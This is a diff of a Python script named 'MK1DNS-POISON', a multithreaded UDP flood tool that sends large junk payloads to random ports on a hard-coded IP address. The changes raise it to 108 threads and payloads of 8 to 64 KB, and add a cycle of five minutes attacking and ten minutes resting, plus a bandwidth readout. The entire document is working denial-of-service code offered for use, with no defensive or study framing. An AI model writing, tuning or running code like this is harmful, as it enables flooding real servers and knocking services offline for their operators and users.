@@ -4,7 +4,7 @@ import time
 import random
 
 target = "162.0.217.103"
-THREADS_PER_GROUP = 54  # 2x groups = 108 total threads
+MIN_THREADS = 108  # 2x54
 
 # Colors
 RED = '\033[91m'
@@ -14,146 +14,124 @@ CYAN = '\033[96m'
 MAGENTA = '\033[95m'
 RESET = '\033[0m'
 
-# Virus payloads - optimized for speed
+# HIGH BANDWIDTH PAYLOADS (NO PACKET COUNT, JUST BIG DATA)
 VIRUS_PAYLOADS = [
-    b'\x00' * 512,      # Null flood
-    b'\xFF' * 256,      # Max bytes
-    b'\x80' * 384,      # High bit pattern
-    random.randbytes(448),  # Random data
+    b'\xDE\xAD\xBE\xEF' * 4096,  # 16KB
+    b'\x00' * 8192,  # 8KB
+    b'\xFF' * 16384,  # 16KB
+    b'\xAA\x55\xCC\x33' * 8192,  # 32KB
+    b'\x80' * 32768,  # 32KB
+    b'\x7F' * 65536,  # 64KB
+    random.randbytes(65536),  # 64KB random
 ]
 
-# Global state with locks for thread safety
+# Cooldown system - DECLARE GLOBALS FIRST
 attack_active = True
 cycle_start = time.time()
-next_cooldown = cycle_start + 300  # First attack: 5 minutes
-stats_lock = threading.Lock()
-state_lock = threading.Lock()
+next_cooldown = cycle_start + 300  # 5 minutes attacking initially
+COOLDOWN_TIME = 600  # 10 minutes resting
+ATTACK_CYCLE = 300   # 5 minutes attacking
 
-# Stats
-total_packets = 0
-stats_reset_time = time.time()
+# Bandwidth stats
+total_bytes = 0
+start_time = time.time()
 
-def update_cooldown_state():
-    """Thread-safe state update"""
-    global attack_active, cycle_start, next_cooldown
+def virus_attack(thread_id):
+    global total_bytes
     
-    current_time = time.time()
-    
-    with state_lock:
-        if current_time >= next_cooldown:
-            if attack_active:
-                # Switch to cooldown
-                attack_active = False
-                cycle_start = current_time
-                next_cooldown = current_time + 600  # 10 minutes cooldown
-                return "COOLDOWN_START"
-            else:
-                # Switch to attack
-                attack_active = True
-                cycle_start = current_time
-                next_cooldown = current_time + 300  # 5 minutes attack
-                return "ATTACK_START"
-    return None
-
-def virus_attack(group_id, thread_id):
-    """Efficient attack function"""
-    global total_packets
-    
-    # Create socket once per thread (efficient)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.settimeout(0.001)  # Tiny timeout
-    
-    # Pre-calc some ports for speed
-    ports = [random.randint(1024, 65535) for _ in range(100)]
-    port_index = 0
     
     while True:
-        # Check state every 100 packets (efficient)
-        if thread_id % 100 == 0:
-            state_change = update_cooldown_state()
-            if state_change == "COOLDOWN_START":
-                print(f"\n{YELLOW}[COOLDOWN] Group {group_id} resting for 10min{RESET}")
-            elif state_change == "ATTACK_START":
-                print(f"\n{GREEN}[ATTACK] Group {group_id} firing for 5min{RESET}")
+        current_time = time.time()
         
-        # Get current state safely
-        with state_lock:
-            active = attack_active
+        # Check cooldown state WITHOUT GLOBAL DECLARATION INSIDE LOOP
+        if current_time >= next_cooldown:
+            # Use function to handle state change
+            handle_state_change(current_time)
         
-        if active:
+        # Only send if attack is active
+        if attack_active:
             try:
-                # Fast batch sending - 10 packets per loop
-                for _ in range(10):
-                    payload = VIRUS_PAYLOADS[thread_id % 4]  # Cycle through 4 payloads
-                    port = ports[port_index % 100]
-                    port_index += 1
-                    
-                    sock.sendto(payload, (target, port))
-                    
-                    with stats_lock:
-                        total_packets += 1
-                        
+                # MAX BANDWIDTH - SEND HUGE PACKETS
+                payload = random.choice(VIRUS_PAYLOADS)
+                port = random.randint(1, 65535)
+                
+                sock.sendto(payload, (target, port))
+                total_bytes += len(payload)
+                
             except:
-                # Silent fail, continue
-                pass
+                try:
+                    sock.close()
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                except:
+                    pass
         else:
-            # Cooldown: sleep longer to save CPU
+            # DEEP SLEEP during cooldown
             time.sleep(0.5)
 
-# Launch 2 groups of 54 threads
-print(f"{MAGENTA}╔══════════════════════════════════════╗{RESET}")
-print(f"{MAGENTA}║    {RED}MK1DNS-POISON V2{RESET} {MAGENTA}           ║{RESET}")
-print(f"{MAGENTA}║    {CYAN}EFFICIENT MODE{RESET} {MAGENTA}             ║{RESET}")
-print(f"{MAGENTA}╚══════════════════════════════════════╝{RESET}")
-print(f"{GREEN}Target:{RESET} {target}")
-print(f"{CYAN}Threads:{RESET} {THREADS_PER_GROUP*2} (2x{THREADS_PER_GROUP} groups)")
-print(f"{YELLOW}Cooldown:{RESET} 5min attack → 10min rest")
-print()
+def handle_state_change(current_time):
+    global attack_active, cycle_start, next_cooldown
+    
+    if attack_active:
+        # Enter cooldown
+        attack_active = False
+        cycle_start = current_time
+        next_cooldown = current_time + COOLDOWN_TIME
+        print(f"\n{YELLOW}[COOLDOWN ACTIVE] Resting for 10 minutes{RESET}")
+    else:
+        # Resume attack
+        attack_active = True
+        cycle_start = current_time
+        next_cooldown = current_time + ATTACK_CYCLE
+        print(f"\n{GREEN}[ATTACK RESUMED] Firing for 5 minutes{RESET}")
 
-# Start group 1
-for i in range(THREADS_PER_GROUP):
-    t = threading.Thread(target=virus_attack, args=(1, i), daemon=True)
+# Launch threads
+print(f"{RED}MK1DNS-POISON{RESET} | Target: {target}")
+print(f"{GREEN}Starting {MIN_THREADS} bandwidth threads...{RESET}")
+print(f"{CYAN}Cooldown: {ATTACK_CYCLE//60}min attack → {COOLDOWN_TIME//60}min rest{RESET}")
+print(f"{MAGENTA}Payload size: 8KB - 64KB{RESET}")
+
+for i in range(MIN_THREADS):
+    t = threading.Thread(target=virus_attack, args=(i,))
+    t.daemon = True
     t.start()
 
-# Start group 2
-for i in range(THREADS_PER_GROUP):
-    t = threading.Thread(target=virus_attack, args=(2, i + THREADS_PER_GROUP), daemon=True)
-    t.start()
-
-# Status monitor
+# Status display
 last_display = 0
-print(f"{GREEN}[+] All threads started{RESET}")
-
 while True:
-    time.sleep(2)  # Check less frequently
+    time.sleep(1)
     
     current_time = time.time()
+    elapsed_total = current_time - start_time
     
-    # Update display every 10 seconds
-    if current_time - last_display >= 10:
-        with stats_lock:
-            packets = total_packets
-            total_packets = 0
+    # Update display every 5 seconds
+    if current_time - last_display >= 5:
+        # Calculate bandwidth (Mbps)
+        if elapsed_total > 0:
+            mbps = (total_bytes * 8) / (elapsed_total * 1_000_000)
+        else:
+            mbps = 0
         
-        elapsed = current_time - stats_reset_time
-        pps = int(packets / elapsed) if elapsed > 0 else 0
+        # Time remaining in current state
+        time_left = max(0, next_cooldown - current_time)
+        minutes = int(time_left // 60)
+        seconds = int(time_left % 60)
         
-        # Get time remaining
-        with state_lock:
-            time_left = max(0, next_cooldown - current_time)
-            active = attack_active
-            mins = int(time_left // 60)
-            secs = int(time_left % 60)
-        
-        if active:
+        if attack_active:
             state_color = GREEN
-            state_text = "FIRING"
+            state_text = "ATTACKING"
+            bw_color = RED
         else:
             state_color = YELLOW
-            state_text = "RESTING"
+            state_text = "COOLDOWN"
+            bw_color = YELLOW
         
-        print(f"{RED}MK1{RESET}:{GREEN}{pps}/s{RESET} | "
-              f"{state_color}{state_text} {mins:02d}:{secs:02d}{RESET}")
+        print(f"{RED}MK1DNS-POISON{RESET}:{bw_color}{mbps:.1f}Mbps{RESET} | "
+              f"{state_color}{state_text} {minutes:02d}:{seconds:02d}{RESET}")
         
-        stats_reset_time = current_time
         last_display = current_time
+    
+    # Reset stats every minute
+    if elapsed_total >= 60:
+        total_bytes = 0
+        start_time = time.time()
